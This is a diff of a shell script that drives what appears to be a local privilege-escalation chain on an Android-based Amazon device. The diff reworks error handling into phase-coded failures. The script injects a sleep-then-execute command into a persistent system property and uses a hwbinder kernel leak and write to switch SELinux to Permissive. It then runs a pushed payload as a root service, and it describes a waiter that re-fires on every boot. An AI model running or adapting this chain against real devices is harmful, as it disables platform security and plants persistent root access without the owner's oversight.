@@ -26,14 +26,22 @@ payload_device="${1:-}"
 waiter_dir=/data/securedStorageLocation/w
 waiter_trigger='x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000'
 old_time_file=/data/local/tmp/__reroot_old_time
+. "$repo_dir/scripts/carrier_abi.sh"
+. "$repo_dir/scripts/phase_b_status.sh"
 
 adb() { "$adb_bin" "$@"; }
 
-die() { echo "FATAL: $*" >&2; exit 1; }
+fail_phase() {
+  failure_code="$1"
+  shift
+  echo "SNU_PHASE_B_FAILURE=$(phase_b_failure_name "$failure_code")" >&2
+  echo "FATAL: $*" >&2
+  exit "$failure_code"
+}
 stage_hdr() { echo; echo "== $1 =="; }
 
 if [ -n "$payload_device" ]; then
-  [ -f "$payload_device" ] || die "payload file not found: $payload_device"
+  [ -f "$payload_device" ] || fail_phase "$PHASE_B_PRECHECK" "payload file not found: $payload_device"
 else
   echo "WARN: no payload supplied; chain will be built and stuck before the uid-0 run." >&2
 fi
@@ -44,25 +52,25 @@ for i in $(seq 1 60); do
   [ "$boot" = 1 ] && break
   sleep 5
 done
-[ "$boot" = 1 ] || die "boot_completed never reached"
+[ "$boot" = 1 ] || fail_phase "$PHASE_B_PRECHECK" "boot_completed never reached"
 
 exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' 2>&1 | tr -d '\r')"
-[ "$exempt" = null ] || [ -z "$exempt" ] || die "stale exemptions value present: $exempt"
+[ "$exempt" = null ] || [ -z "$exempt" ] || fail_phase "$PHASE_B_PRECHECK" "stale exemptions value present: $exempt"
 
 saved_time="$(adb shell getprop persist.sys.saved_time 2>&1 | tr -d '\r')"
 old_time="$(adb shell "cat $old_time_file" 2>&1 | tr -d '\r')"
 case "$old_time" in
-  ''|*[!0-9]*) die "unsafe saved_time present: $old_time" ;;
+  ''|*[!0-9]*) fail_phase "$PHASE_B_WAITER_STATE" "unsafe saved_time restore value: $old_time" ;;
 esac
 [ "$saved_time" = "$waiter_trigger" ] \
-  || die "time_update waiter is not armed: saved_time=$saved_time"
+  || fail_phase "$PHASE_B_WAITER_STATE" "time_update waiter is not armed: saved_time=$saved_time"
 echo "boot=1 saved_time=WAITER_ARMED restore_value=$old_time exemptions=null"
 
 if [ -n "$payload_device" ]; then
   adb push "$payload_device" /data/local/tmp/__reroot_payload.sh >/dev/null 2>&1 \
-    || die "payload push failed"
+    || fail_phase "$PHASE_B_PRECHECK" "payload push failed"
   adb shell "chmod 0755 /data/local/tmp/__reroot_payload.sh" >/dev/null 2>&1 \
-    || die "payload chmod failed"
+    || fail_phase "$PHASE_B_PRECHECK" "payload chmod failed"
 fi
 
 stage_hdr "boot-wiring precheck"
@@ -109,20 +117,17 @@ carrier_start() {
 
 if ! carrier_up; then
   echo "carrier absent -> spawn deterministic app_process64 carrier"
-  carrier_start || die "carrier respawn failed"
+  carrier_start || fail_phase "$PHASE_B_CARRIER_START" "carrier start failed before hwbinder was attempted"
   echo "carrier respawned, PONG"
 else
   echo "carrier already live"
 fi
 identity="$(carrier_identity)"
 echo "carrier_identity=$identity"
-case "$identity" in
-  *uid=10100*context=u:r:amazon_app:s0*Groups=*3003*) : ;;
-  *) die "carrier is not the required uid-10100/amazon_app process with group 3003: $identity" ;;
-esac
-
-carrier_pid="$(printf '%s\n' "$identity" | sed -n 's/.* pid=\([0-9][0-9]*\).*/\1/p')"
-[ -n "$carrier_pid" ] || die "carrier ID did not include a PID: $identity"
+if ! carrier_validate_identity "$identity" "$asset_dir"; then
+  fail_phase "$PHASE_B_VALIDATION" "carrier validation failed: $CARRIER_VALIDATION_ERROR"
+fi
+carrier_pid="$CARRIER_PID"
 supported_abis="$(adb shell getprop ro.product.cpu.abilist 2>&1 | tr -d '\r')"
 [ -n "$supported_abis" ] || supported_abis="$(adb shell getprop ro.product.cpu.abi | tr -d '\r')"
 remote_elf_class() {
@@ -133,16 +138,9 @@ remote_elf_class() {
     *) echo UNKNOWN ;;
   esac
 }
-carrier_class="$(printf '%s\n' "$identity" | sed -n 's/.* elf=\([^ ]*\).*/\1/p')"
-reported_abi="$(printf '%s\n' "$identity" | sed -n 's/.* abi=\([^ ]*\).*/\1/p')"
-selected_jni="$(printf '%s\n' "$identity" | sed -n 's/.* jni=\([^ ]*\).*/\1/p')"
-case "$carrier_class" in ELF64) carrier_abi=arm64-v8a ;; ELF32) carrier_abi=armeabi-v7a ;; *)
-  die "carrier could not determine ELF class from /proc/self/exe: $identity" ;; esac
-[ "$reported_abi" = "$carrier_abi" ] \
-  || die "carrier ABI report disagrees with its ELF class: abi=$reported_abi elf=$carrier_class"
-expected_jni="$asset_dir/libhwbinder_target.$carrier_abi.so"
-[ "$selected_jni" = "$expected_jni" ] \
-  || die "carrier selected unexpected JNI path: selected=$selected_jni expected=$expected_jni"
+carrier_class="$CARRIER_ELF"
+carrier_abi="$CARRIER_ABI"
+selected_jni="$CARRIER_JNI"
 native_path="$selected_jni"
 native_class="$(remote_elf_class "$native_path")"
 selected_class="$native_class"
@@ -152,11 +150,11 @@ echo "carrier_abi=$carrier_abi carrier_elf_class=$carrier_class"
 echo "selected_jni_library=$selected_jni selected_elf_class=$selected_class"
 echo "native_library=$native_path native_elf_class=$native_class"
 [ "$selected_class" = "$carrier_class" ] \
-  || die "no compatible packaged JNI payload for carrier $carrier_pid ($carrier_class)"
+  || fail_phase "$PHASE_B_VALIDATION" "carrier validation failed: no compatible packaged JNI payload for PID $carrier_pid ($carrier_class)"
 [ "$native_class" = "$carrier_class" ] \
-  || die "selected JNI payload does not match carrier $carrier_pid: carrier=$carrier_class native=$native_class selected=$selected_jni"
+  || fail_phase "$PHASE_B_VALIDATION" "carrier validation failed: selected JNI payload mismatch (carrier=$carrier_class native=$native_class selected=$selected_jni)"
 [ "$carrier_class" = ELF64 ] \
-  || die "32-bit Binder compat ABI cannot carry the primitive's 64-bit kernel pointers; deterministic app_process64 carrier launch failed"
+  || fail_phase "$PHASE_B_VALIDATION" "carrier validation failed: 32-bit Binder compat ABI cannot carry the primitive's 64-bit kernel pointers"
 
 stage_hdr "3/7 stateful leak (boot-spent on ENODATA; reboot to retry)"
 # Single shot on the fresh carrier. ENODATA (0x50+errno 61) means the
@@ -180,7 +178,7 @@ case "$leak" in
     echo "leak result not cleared (stateful leak failed). This boot's binder-node state is spent;"
     echo "NULL write requires a fresh kernel boot (in-boot carrier respawn cannot clear ENODATA/EALREADY)."
     echo "leak=$leak"
-    die "stateful leak failed on fresh carrier: $leak"
+    fail_phase "$PHASE_B_STATEFUL_SPENT" "stateful leak failed on fresh carrier: $leak"
     ;;
 esac
 
@@ -189,13 +187,13 @@ w1="$(printf 'HWBINDER_STATEFUL_WRITE\n' | adb shell "toybox nc -w 6 127.0.0.1 $
 echo "HWBINDER_STATEFUL_WRITE $w1"
 case "$w1" in
   *result=0x51*) : ;;
-  *) die "unexpected write result: $w1" ;;
+  *) fail_phase "$PHASE_B_POST_WRITE" "unexpected write result: $w1" ;;
 esac
 
 stage_hdr "5/7 verify Permissive"
 enforce="$(adb shell getenforce 2>&1 | tr -d '\r')"
 echo "getenforce=$enforce"
-[ "$enforce" = Permissive ] || die "SELinux still enforcing after write"
+[ "$enforce" = Permissive ] || fail_phase "$PHASE_B_POST_WRITE" "SELinux still enforcing after write"
 
 if [ -z "$payload_device" ]; then
   echo "no payload given; chain built and Permissive verified. exiting clean."
@@ -215,7 +213,7 @@ done
 echo "root_service=$root_reply"
 case "$root_reply" in
   0*u:r:time_update:s0*) : ;;
-  *) die "pre-armed time_update payload did not create the root service" ;;
+  *) fail_phase "$PHASE_B_WAITER_STATE" "pre-armed time_update payload did not create the root service after successful Binder write" ;;
 esac
 adb logcat -d -s REROOTWAIT:I REROOT:I ROOTSVC:I '*:S' || true
 echo "saved_time_now=$(adb shell getprop persist.sys.saved_time | tr -d '\r')"
@@ -234,14 +232,14 @@ case "$restored" in
   x*)
     echo "saved_time still armed -> persistent-root waiter re-fires every boot" ;;
   ''|*[!0-9]*)
-    die "unexpected saved_time state: $restored" ;;
+    fail_phase "$PHASE_B_POST_WRITE" "unexpected saved_time state: $restored" ;;
   *)
     echo "saved_time numeric but != original ($old_time) -> time_update rewrote it; persistence disarmed (safe)" ;;
 esac
 
 exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' | tr -d '\r')"
 echo "exemptions=$exempt"
-[ "$exempt" = null ] || die "exemptions left set"
+[ "$exempt" = null ] || fail_phase "$PHASE_B_POST_WRITE" "exemptions left set"
 
 echo "enforce=$(adb shell getenforce | tr -d '\r')"
 echo "OK reroot flow complete"
